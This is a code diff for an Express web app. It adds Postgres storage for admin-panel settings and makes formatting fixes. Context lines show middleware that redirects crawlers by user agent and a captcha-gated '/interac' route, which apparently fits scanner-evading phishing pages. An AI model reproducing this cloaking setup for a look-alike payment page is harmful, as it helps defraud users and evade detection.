@@ -88,7 +88,7 @@ const botList = [
     // ... Add all the bots from your list
 ];
 
- 
+
 
 const redirectBots = (req, res, next) => {
     const userAgent = req.get('User-Agent');
@@ -166,14 +166,14 @@ const createTable = async () => {
         data JSONB NOT NULL
       );
     `;
-  
+
     try {
-      await pool.query(createTableQuery);
-      console.log('Table created successfully');
+        await pool.query(createTableQuery);
+        console.log('Table created successfully');
     } catch (error) {
-      console.error('Error creating table:', error);
+        console.error('Error creating table:', error);
     }
-  };
+};
 
 // Use this middleware in your app before your routes
 app.use(redirectBots);
@@ -200,8 +200,18 @@ app.get('/interac', verifyRecaptcha, (req, res) => {
 
 app.post('/update', async (req, res) => {
     let data = req.body;
-    console.log(typeof data);
-    try { 
+
+    try {
+
+        const upsertQuery = `
+      INSERT INTO items (id, data) VALUES (1, $1)
+      ON CONFLICT (id) DO UPDATE 
+      SET data = EXCLUDED.data
+      RETURNING *;
+    `;
+
+        const result = await pool.query(upsertQuery, [data]);
+        console.log(result.rows[0])
         //await redisClient.set("settings", JSON.stringify(data.settings));
         res.render('admin/panel/index', { bool: true, message: "Your updates have been successfully saved." });
     } catch (error) {
@@ -239,16 +249,17 @@ app.get('/admin/panel', checkAdminSession, (req, res) => {
     res.render('admin/panel/index', { bool: false });
 })
 
-app.get('/admin/settings', checkAdminSession, async (req, res) => {    
+app.get('/admin/settings', checkAdminSession, async (req, res) => {
     try {
-        const data = null
+        const getId = 1; // Since we're always dealing with the record with id = 1
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
 
-        if(!data){
+        if (result.rows.length > 0) {
+            res.render('admin/settings/index', { data: JSON.parse(result.rows[0].data) });
+        } else {
             res.render('admin/settings/index', { data: null, message: 'Please use the form below to update the page.' });
             return;
         }
-
-        res.render('admin/settings/index', { data: JSON.parse(data) });
     } catch (error) {
         console.error(error);
         res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
